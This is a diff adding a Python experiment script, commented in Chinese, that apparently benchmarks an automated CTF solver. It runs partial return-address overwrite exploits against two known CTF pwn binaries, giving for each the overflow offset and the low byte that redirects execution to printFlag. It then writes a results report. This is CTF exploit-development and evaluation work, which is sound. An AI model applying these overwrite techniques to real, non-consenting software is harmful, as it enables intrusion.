@@ -1,0 +1,134 @@
+"""
+v036_partial_overwrite.src — partial overwrite：PIE 半覆盖真实赛题
+
+题目
+    pwn2（TAMUctf 2019，32 位 PIE）：溢出只改返回地址低字节到 printFlag；
+    vuln-chat2.0（TUCTF 2017，32 位）：用户名后溢出，改返回地址低字节到 printFlag；
+    partial-gets（XNUCA 2018）：镜像二进制与参考脚本地址对不上，标不支持。
+
+运行
+    python versions/v036_partial_overwrite.src
+"""
+
+from __future__ import annotations
+
+import json
+import sys
+import time
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0036"
+REAL_36 = OUT_DIR / "real"
+REAL_35 = ROOT / "experiments" / "EXP-0035" / "real"
+
+sys.path.insert(0, str(ROOT / "src"))
+
+from secknow.solving.adapters import PwntoolsWorker, ToolUnavailable  # noqa: E402
+from secknow.solving.binary import analyze  # noqa: E402
+from secknow.solving.chains import build_chains  # noqa: E402
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+CASES = [
+    {"id": "pwn2", "dir": REAL_36, "note": "TAMUctf 2019：PIE 低字节覆盖到 printFlag",
+     "strategy": "partial", "offset": 0x1E, "patch": bytes([0xD8]),
+     "marker": "flag{"},
+    {"id": "vuln-chat2.0", "dir": REAL_36, "note": "TUCTF 2017：用户名后低字节覆盖",
+     "strategy": "partial", "offset": 0x2B, "patch": bytes([0x72]),
+     "marker": "flag{", "prompt": b"guyinatuxedo: ", "newline": False,
+     "pre_prompt": b"Enter your username: ", "pre_send": b"guyinatuxedo"},
+    {"id": "partial-gets", "dir": REAL_35, "note": "XNUCA 2018：参考地址与镜像不符",
+     "strategy": "unsupported", "reason": "mirror_mismatch_0x400216_not_in_text"},
+]
+
+
+def evaluate(worker: PwntoolsWorker, case: dict) -> dict:
+    binary = Path(case["dir"]) / case["id"]
+    started = time.perf_counter()
+    record = {"id": case["id"], "note": case["note"], "strategy": case["strategy"]}
+    try:
+        profile = analyze(binary)
+        record.update({
+            "bits": profile.bits, "pie": profile.is_pie,
+            "entries": [finding.category for finding in profile.findings()],
+            "chains": [{"id": chain.chain_id, "status": chain.status}
+                       for chain in build_chains(
+                           [finding.category for finding in profile.findings()], profile)],
+        })
+    except Exception as error:  # noqa: BLE001
+        record.update({"verdict": "failed", "reason": f"analyze:{type(error).__name__}"})
+        record["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+        return record
+
+    if case["strategy"] == "unsupported":
+        record.update({"verdict": "unsupported", "reason": case["reason"]})
+    else:
+        try:
+            result = worker.partial_overwrite(
+                binary, case["offset"], case["patch"],
+                prompt=case.get("prompt"), newline=case.get("newline", True),
+                marker=case["marker"], pre_prompt=case.get("pre_prompt"),
+                pre_send=case.get("pre_send"))
+        except ToolUnavailable as error:
+            record.update({"verdict": "failed", "reason": str(error)})
+        else:
+            record.update({"verdict": "solved" if result.get("solved") else "failed",
+                           "reason": None if result.get("solved") else result.get("error")})
+    record["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+    log(f"{case['id']}: {record['verdict']} ({record.get('reason') or '—'})"
+        f"  {record['elapsed_ms']} ms")
+    return record
+
+
+def write_report(results: list[dict]) -> None:
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    summary = {
+        "cases": len(results),
+        "solved": sum(1 for item in results if item.get("verdict") == "solved"),
+        "unsupported": sum(1 for item in results if item.get("verdict") == "unsupported"),
+        "failed": sum(1 for item in results if item.get("verdict") == "failed"),
+    }
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "cases": results}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+    lines = ["# EXP-0036 — partial overwrite 真实赛题", "",
+             "## 汇总", "", "```json", json.dumps(summary, ensure_ascii=False, indent=2),
+             "```", "",
+             "| 题 | 判定 | 链 | 说明 | 耗时 |",
+             "| --- | --- | --- | --- | --- |"]
+    for item in results:
+        chains = ", ".join(chain["id"] for chain in item.get("chains", [])) or "—"
+        lines.append(f"| {item['id']} | {item.get('verdict')} | {chains} "
+                     f"| {item.get('reason') or item['note']} | {item.get('elapsed_ms')} ms |")
+    lines += ["", "## 说明", "",
+              "- 两道题都是真实 PIE/低字节覆盖：只改返回地址低字节，命中 printFlag；",
+              "- 产品链：PIE + 命中后门候选时给出 partial-overwrite（needs-execution）；",
+              "- partial-gets 的镜像里 .text 从 0x400420 开始，参考脚本的 0x400216 不存在，"
+              "属于镜像/版本不一致，标不支持。"]
+    (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+
+def main() -> None:
+    worker = PwntoolsWorker()
+    log(f"worker available={worker.available(timeout=60)} version={worker.version}")
+    results = [evaluate(worker, case) for case in CASES]
+    worker.close()
+    write_report(results)
+    summary = json.loads((OUT_DIR / "results.json").read_text(encoding="utf-8"))["summary"]
+    log(f"汇总：解出 {summary['solved']}/{summary['cases']}，"
+        f"不支持 {summary['unsupported']}，失败 {summary['failed']}")
+
+
+if __name__ == "__main__":
+    main()
